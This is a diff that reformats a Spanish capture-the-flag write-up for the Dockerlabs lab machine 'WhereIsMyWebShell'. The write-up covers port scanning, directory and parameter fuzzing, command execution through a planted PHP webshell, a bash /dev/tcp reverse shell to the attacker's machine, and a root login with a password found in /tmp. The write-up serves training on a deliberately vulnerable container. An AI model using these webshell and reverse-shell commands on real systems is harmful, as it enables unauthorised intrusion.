@@ -1,22 +1,30 @@
-# 🖥️ Writeup - WhereIsMyWebShell 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# WhereIsMyWebShell ​​
+
+## 🖥️ Writeup - WhereIsMyWebShell
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `PHP` `Gobuster` `Wfuzz` `RCE` `Web Shell`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip whereismywebshell.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh whereismywebshell.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 15:02 CET
 Nmap scan report for 172.17.0.2
@@ -83,7 +92,7 @@ Al acceder a la página web, encontramos el siguiente comentario al final de la 
 
 Esto probablemente nos servirá más adelante.
 
-# GOBUSTER
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.
 
@@ -92,6 +101,7 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/D
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -114,7 +124,7 @@ Starting gobuster in directory enumeration mode
 Progress: 1335871 / 1543899 (86.53%)
 ```
 
-Encontramos un archivo `warning.html` que contiene el siguiente mensaje: 
+Encontramos un archivo `warning.html` que contiene el siguiente mensaje:
 
 ```
 Esta web ha sido atacada por otro hacker, pero su webshell tiene un parámetro que no recuerdo...
@@ -124,8 +134,7 @@ Intuimos que el archivo `shell.php` que hemos encontrado es la `webshell` que ha
 
 Sin embargo, el mensaje en `warning.html` nos da una pista, la `webshell` requiere un `parámetro`, y este podría permitir `RCE` (Remote Code Execution)
 
-
-# WFUZZ
+## WFUZZ
 
 Procedemos a intentar descubrir el `parámetro` mediante `fuzzing`.
 
@@ -134,6 +143,7 @@ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-
 ```
 
 Info:
+
 ```
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -156,7 +166,7 @@ Requests/sec.: 1643.095
 
 Encontramos un parámetro, `parameter`, que nos devuelve un código de estado `200` (OK)
 
-# RCE
+## RCE
 
 Probamos a ejecutar un comando usando el parámetro `parameter` que hemos encontrado.
 
@@ -165,6 +175,7 @@ http://172.17.0.2/shell.php?parameter=id
 ```
 
 Info:
+
 ```
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -190,38 +201,44 @@ http://172.17.0.2/shell.php?parameter=bash -c 'bash -i >%26 %2fdev%2ftcp%2f172.1
 ```
 
 Info:
+
 ```
 listening on [any] 4444 ...
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 43934
 bash: cannot set terminal process group (23): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@6aa01e22d477:/var/www/html$
-``` 
+```
 
 Recibimos la conexión de la `reverse shell` con permisos del usuario `www-data`.
 
-# TTY
+## TTY
 
 Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:
 
 ```bash
 script /dev/null -c bash
 ```
+
 `ctrl Z`
+
 ```bash
 stty raw -echo; fg
 ```
+
 ```bash
 reset xterm
 ```
+
 ```bash
 export TERM=xterm
 ```
+
 ```bash
 export BASH=bash
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Recordamos la pista anterior sobre un archivo en `/tmp`.
 
@@ -239,6 +256,7 @@ su root
 ```
 
 Info:
+
 ```
 www-data@6aa01e22d477:/tmp$ su root
 Password: contraseñaderoot123
